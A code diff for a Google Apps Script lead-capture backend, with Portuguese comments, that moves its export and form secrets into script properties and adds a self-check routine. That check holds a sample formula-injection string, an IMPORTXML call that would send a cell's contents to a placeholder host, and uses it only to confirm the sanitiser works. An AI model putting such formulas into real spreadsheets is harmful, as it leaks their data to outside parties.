@@ -51,9 +51,35 @@ var PREFIXO_ID = 'CRX-';
                    afastar quem chega pela URL solta, sem ler o site.
    ========================================================= */
 
-/* Repetir o mesmo valor em cronex-site/js/main.js (CONTATO.chave).
-   Vazio = camada 3 desligada; as camadas 1 e 2 seguem valendo. */
-var SEGREDO_ENVIO = '';
+/* =========================================================
+   Onde ficam os segredos
+
+   Os dois valores abaixo vivem nas PROPRIEDADES DO SCRIPT, não no código:
+   Configurações do projeto → Propriedades do script → Adicionar propriedade.
+
+   O motivo é prático. Enquanto o segredo morava numa linha deste arquivo,
+   colar uma versão nova por cima apagava o valor e derrubava a exportação em
+   silêncio — o sistema de gestão simplesmente parava de importar leads e
+   ninguém ficava sabendo. Fora das Propriedades, o arquivo pode ser colado,
+   versionado e compartilhado sem carregar segredo nenhum.
+
+   | Propriedade         | Para que serve                                    |
+   |---------------------|---------------------------------------------------|
+   | SEGREDO_EXPORTACAO  | libera ?acao=exportar. O MESMO valor vai no        |
+   |                     | sistema, em Configurações → Planilhas.            |
+   | SEGREDO_ENVIO       | filtro do formulário. O MESMO valor vai em         |
+   |                     | cronex-site/js/main.js (CONTATO.chave).           |
+
+   Vazias, as duas falham do lado seguro: exportação desligada, e o filtro do
+   formulário simplesmente não roda (texto_ e limitado_ seguem valendo).
+   ========================================================= */
+function segredo_(nome) {
+  try {
+    return String(PropertiesService.getScriptProperties().getProperty(nome) || '').trim();
+  } catch (err) {
+    return '';
+  }
+}
 
 var LIMITE_POR_REMETENTE = 5;    // envios do mesmo telefone/e-mail
 var LIMITE_TOTAL = 100;          // envios de todo mundo somados
@@ -93,7 +119,8 @@ function doPost(e) {
     var p = (e && e.parameter) ? e.parameter : {};
 
     // recusa em silêncio: responder "bloqueado" só ensina o atacante a ajustar
-    if (SEGREDO_ENVIO && p.chave !== SEGREDO_ENVIO) return json_({ ok: true });
+    var chaveEsperada = segredo_('SEGREDO_ENVIO');
+    if (chaveEsperada && p.chave !== chaveEsperada) return json_({ ok: true });
     if (limitado_(p.telefone || p.email || p.pagina || 'anon')) return json_({ ok: true });
 
     var quando = new Date();
@@ -119,21 +146,21 @@ function doPost(e) {
  * de gestão importar (ver README, seção "Exportar para o sistema").
  *
  * O segredo é obrigatório na exportação — sem ele, qualquer pessoa com a URL
- * leria a base de leads inteira. Defina em SEGREDO_EXPORTACAO abaixo e repita
- * o mesmo valor no sistema, em Configurações → Planilhas.
+ * leria a base de leads inteira. Fica na propriedade do script
+ * SEGREDO_EXPORTACAO (ver o bloco "Onde ficam os segredos" no topo), e o
+ * mesmo valor vai no sistema, em Configurações → Planilhas.
  */
-var SEGREDO_EXPORTACAO = '';   // <-- defina um valor longo e aleatório
-
 function doGet(e) {
   var p = (e && e.parameter) ? e.parameter : {};
 
   if (p.acao !== 'exportar') {
     return json_({ ok: true, servico: 'CRONEX leads', hora: new Date().toISOString() });
   }
-  if (!SEGREDO_EXPORTACAO) {
-    return json_({ erro: 'exportacao desativada: defina SEGREDO_EXPORTACAO no script' });
+  var esperado = segredo_('SEGREDO_EXPORTACAO');
+  if (!esperado) {
+    return json_({ erro: 'exportacao desativada: defina a propriedade do script SEGREDO_EXPORTACAO' });
   }
-  if (p.segredo !== SEGREDO_EXPORTACAO) {
+  if (p.segredo !== esperado) {
     Utilities.sleep(1000);                 // encarece tentativa de adivinhar
     return json_({ erro: 'segredo invalido' });
   }
@@ -272,6 +299,37 @@ function procurarFormulas() {
   var msg = achados.length
     ? 'ATENÇÃO — ' + achados.length + ' fórmula(s) encontrada(s):\n' + achados.join('\n')
     : 'Nenhuma fórmula nas abas de dados. Planilha limpa.';
+  console.log(msg);
+  return msg;
+}
+
+/**
+ * Conferência pós-instalação. Rode pelo editor ANTES de implantar:
+ * selecionar "conferirInstalacao" → Executar → ler em Execuções.
+ *
+ * Diz se as propriedades estão no lugar e prova que a neutralização de
+ * fórmula funciona, sem gravar nada na planilha.
+ */
+function conferirInstalacao() {
+  var exportacao = segredo_('SEGREDO_EXPORTACAO');
+  var envio = segredo_('SEGREDO_ENVIO');
+
+  var amostra = '=IMPORTXML("https://exemplo.invalido/?d="&A2,"//a")';
+  var protegido = texto_(amostra).charAt(0) === "'";
+
+  var linhas = [
+    'SEGREDO_EXPORTACAO: ' + (exportacao
+      ? 'definido (' + exportacao.length + ' caracteres) — exportação de leads LIGADA'
+      : 'VAZIO — a exportação está desligada e o sistema de gestão NÃO vai importar leads'),
+    'SEGREDO_ENVIO: ' + (envio
+      ? 'definido (' + envio.length + ' caracteres) — o site precisa mandar a MESMA chave em CONTATO.chave, senão o formulário para de gravar'
+      : 'vazio — filtro desligado (tudo bem; texto_ e limitado_ seguem valendo)'),
+    'Neutralização de fórmula: ' + (protegido ? 'FUNCIONANDO' : 'FALHOU — não implante'),
+    'Limites: ' + LIMITE_POR_REMETENTE + ' por remetente e ' + LIMITE_TOTAL +
+      ' no total, a cada ' + (JANELA_S / 60) + ' minutos'
+  ];
+
+  var msg = linhas.join('\n');
   console.log(msg);
   return msg;
 }
